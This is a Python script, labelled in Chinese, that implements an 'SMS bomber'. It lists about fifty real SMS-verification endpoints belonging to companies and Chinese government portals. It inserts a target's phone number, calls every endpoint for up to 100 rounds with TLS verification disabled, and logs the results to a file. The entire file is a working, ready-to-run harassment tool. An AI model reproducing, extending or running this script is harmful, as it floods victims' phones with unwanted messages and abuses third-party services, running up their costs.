import requests
import re
import time
import json


class SimpleSMSBomber:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        # 去重后的接口列表
        self.urls = self._get_unique_urls()

    def _get_unique_urls(self):
        """获取去重后的接口列表"""
        raw_urls = [
            "https://lucky.mobile.taikang.com/lucky/marketplace/common/sendVerificationCodeMsg/oaOml5PElObEexPr9WIecYDcRONA/18888888888",
            "https://remote-meter.cn:8098/mt-flowJingM/applet/user/profiles/getCode?phone=15036734956",
            "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone=15036734956&smstype=1",
            "https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=1888888888886&appId=www_home&v=2&sig=&t=1592615855903&v=2",
            "https://passport.17173.com/register/validate?field=mobile&value=15036734956",
            "https://fd.cmdjh.com/wfmall//app/sendCode?nationalCode=0086&mobile=15039734956&companyId=1000001",
            "https://applet.mbadashi.com/appletapi/applet/authorizations/smscode?mobile=15936734956",
            "https://auth.fuliyou.com/api//index/?time=1734440153&phone=15088888888&type=xy.user.send.phone&sign=eeeb401eb9837dadfd4c135ba926ec0f&callback=jQuery34104582207158426126_1734440098471&_=1734440098474",
            "https://m.heitu.com/Api/api/cmd/getSmsCode.html?pwd=sbsb114514&tel=15036788856&type=1&isuid=114514",
            "https://m.zhanghaojiaoyi.cn/api/api/member/send/regCode?username=&password=&repPassword=&phone=15036734956&smsCode=",
            "https://api.sdk.49app.com/V7/Accounts/GetCode?callback=apiRegGetPhoneCode&device=3&mobile=15036734956",
            "https://api.portal.cargoon.com/auth/sms?mobile=15036734956",
            "https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_1584688891341&mobile=15036734956",
            "https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile=15036734956",
            "https://www.xizai.com/trade/api/sendvcode?phone=15036734956&sType=1&netType=50350013&vp=6E2CA09F5E3D19B60D1E63BDFDB37082",
            "https://ims.jjebank.cn/prd/mobile/user/openId/authCode?mobile=15036734956",
            "https://shopic.sf-express.com/user/crm/auth/sendUserCode?STOKEN=&UID=&USS=123&cityId=652900000&cityName=阿克苏地区&userPhone=15036734956&uss=123",
            "https://api-sms.gree.com/api/pub/autoapp-default-server-selfservice/api/v2/user/auth/code?phone=15036734956",
            "https://www.17zhanghao.com/prod-api/sms/sendYzm?phone=15036734956&type=phoneLogin",
            "https://www.jncfcj.com/fwzl-applet-client-api/sendSmsCaptcha?phone=15036734956",
            "https://m.doctorpanda.com/panda-h5-web/miniapps/users/sendCode?_t=1733046158995&mobile=15036734956",
            "http://www.tanwan.com/api/reg_json_2019.php?act=3&phone=15036734956&callback=jQuery112003247368730630804_1643269992344&_=1643269992347",
            "https://bsx.baoding12345.cn/web/bduser/register?mobile=15036734956",
            "http://www.17yy.com/e/enews/sms.php?action=send&ask=13&mobilePhone=15036734956",
            "http://www.lssmes.cn/regcode.html?mobile=15036734956",
            "http://www.56master.com/api/master56/open/captcha?mobile=15036734956",
            "https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=8615036734956&appCont=1",
            "https://www.hf12377.cn/prod-api/comm/send/report?phoneNumber=15036734956&channel=JUBAO_REPORT&uuid=88294d4ddbe84560a363453e530c49ae",
            "https://m.16888.com/wap.php?mod=commonApi&extra=mobileCode&mobile=15036734956&token=C9jfKuXX2dkf&verify=b9e66591c552bcb5719e0b5fb45f272b&_=1734329724951",
            "https://bm.ylzyw.cn/zngw/moible_ydgw/mobileydgw.do?method=sendSMS&phone=15036734956&ipAddress=",
            "https://ythpt.jsga.gov.cn/jsgawx/sms/sendSmsByMobile?mobile=15036734956",
            "http://www.smewf.com/api/index/getVerifyCode?mobile=15036734956&type=1",
            "https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile=15036734956&code=&checkNotFlag=1",
            "https://client.uqbike.cn/sms/sendAuthCode.do?accountId=290&phone=15036734956",
            "https://api.tuhu.cn/User/GetIdentityCode?Phone=15036734956&type=0&nationCode=86",
            "http://fz12345.fuzhou.gov.cn/jf/event/sendMsg?phone=15036734956",
            "https://m.luxshare-ict.com/api/Staff/GuestReserveLog/GetTelephoneCode?telephone=15036734956",
            "https://ypc-backstage.zhongkediman.com/v2/user/sendSMSCode?phone=15036734956",
            "https://wx.xjbtsy.com/user/smscode?phone=15036734956",
            "https://m.zol.com.cn/user/ajax/getPhoneCode.php?autype=1&token=348934b357e5758f77e5992ab4accfb6&backUrl=&phone=15036734956&checkcode=885D",
            "https://xaybb.yuanchengkj.com/app/sendPwdResetValidCode?mobile=15036734956",
            "https://m-lf.dcdapp.com/passport/web/send_code/?aid=1556&device_id=72970268243&master_aid=&user_unique_id=72970268243&os_version=Windows 10 x64&ma_version=5.10.279&app_name=wechat&data_from=tt_mp&device_platform=windows&device_type=microsoft&device_brand=microsoft&sdk_verison=3.0.2&api_version=2&version_code=0&city_name=郑州&gps_city_name=&type=24&mobile=15036734956",
            "https://apis.niuxuezhang.cn/v1/sms-code?phone=15036734956",
            "http://zydx.top/mob_code.php?type=reg&mob=15036734956",
            "https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile=15036734956",
            "https://api.admin.qzxzfu.com/mobile-api/v1/api/n/role?phone=18888888888",
            "https://people.lyd.com.cn/app/User/sendPhoneCode/18888888888?plat=bxhs&time=1769143105140"
        ]

        # 去重并替换手机号为{phone}
        unique_urls = []
        seen = set()

        for url in raw_urls:
            # 替换手机号为占位符
            processed = re.sub(r'(phone|mobile|tel|telephone|mob|userPhone|phoneNumber|value|telephone)=[\d]+',
                               r'\1={phone}', url)
            processed = re.sub(r'/[\d]{11,13}(?=[/?]|$)', '/{phone}', processed)

            if processed not in seen:
                seen.add(processed)
                unique_urls.append(processed)

        return unique_urls

    def send_sms(self, phone, repeat=1, delay=0):
        """发送短信
        phone: 手机号
        repeat: 重复次数
        delay: 每次请求之间的延迟(秒)
        """
        if not re.match(r'^1[3-9]\d{9}$', phone):
            print("错误：手机号格式不正确！")
            return []

        print(f"开始发送短信到: {phone}")
        print(f"重复次数: {repeat}")
        print(f"接口数量: {len(self.urls)}")
        print("-" * 50)

        results = []
        success_count = 0
        fail_count = 0

        for cycle in range(repeat):
            print(f"\n第 {cycle + 1}/{repeat} 轮:")

            for i, url in enumerate(self.urls):
                # 替换手机号
                target_url = url.replace("{phone}", phone)

                # 发送请求
                try:
                    response = requests.get(target_url, headers=self.headers,
                                            timeout=5, verify=False)

                    status = response.status_code
                    success = status == 200

                    if success:
                        success_count += 1
                        status_icon = "✅"
                    else:
                        fail_count += 1
                        status_icon = "❌"

                    # 显示结果
                    domain = target_url.split('/')[2] if '//' in target_url else target_url[:30]
                    print(f"{status_icon} [{i + 1:2d}/{len(self.urls)}] {domain}: HTTP {status}")

                    results.append({
                        'url': target_url,
                        'status': status,
                        'success': success
                    })

                except Exception as e:
                    fail_count += 1
                    domain = url.split('/')[2] if '//' in url else url[:30]
                    print(f"❌ [{i + 1:2d}/{len(self.urls)}] {domain}: 请求失败")
                    results.append({
                        'url': url,
                        'status': 0,
                        'success': False,
                        'error': str(e)
                    })

                # 延迟
                if delay > 0 and i < len(self.urls) - 1:
                    time.sleep(delay)

        # 显示统计
        total = success_count + fail_count
        success_rate = (success_count / total * 100) if total > 0 else 0

        print(f"\n" + "=" * 50)
        print(f"发送完成！")
        print(f"成功: {success_count}")
        print(f"失败: {fail_count}")
        print(f"成功率: {success_rate:.1f}%")

        # 保存结果
        self.save_results(phone, results)

        return results

    def save_results(self, phone, results):
        """保存结果到文件"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"sms_{phone}_{timestamp}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"手机号: {phone}\n")
            f.write(f"发送时间: {timestamp}\n\n")

            for i, result in enumerate(results):
                status = "成功" if result['success'] else "失败"
                f.write(f"{i + 1}. {result['url']}\n")
                f.write(f"   状态: {status} (HTTP {result['status']})\n\n")

        print(f"结果已保存到: {filename}")


def main():
    print("短信发送工具")
    print("=" * 50)

    bomber = SimpleSMSBomber()

    # 输入手机号
    while True:
        phone = input("请输入手机号: ").strip()
        if re.match(r'^1[3-9]\d{9}$', phone):
            break
        print("手机号格式不正确！")

    # 输入重复次数
    while True:
        try:
            repeat = int(input("重复次数 (默认1): ").strip() or "1")
            if 1 <= repeat <= 100:
                break
            print("请输入1-100之间的数字！")
        except:
            print("请输入有效的数字！")

    # 输入延迟
    try:
        delay = float(input("每次请求延迟(秒，默认0): ").strip() or "0")
    except:
        delay = 0

    # 确认
    print(f"\n确认发送:")
    print(f"手机号: {phone}")
    print(f"重复次数: {repeat}")
    print(f"请求延迟: {delay}秒")

    if input("\n确认发送? (y/n): ").lower() != 'y':
        print("已取消")
        return

    # 发送
    import urllib3
    urllib3.disable_warnings()

    bomber.send_sms(phone, repeat, delay)


if __name__ == "__main__":
    main()
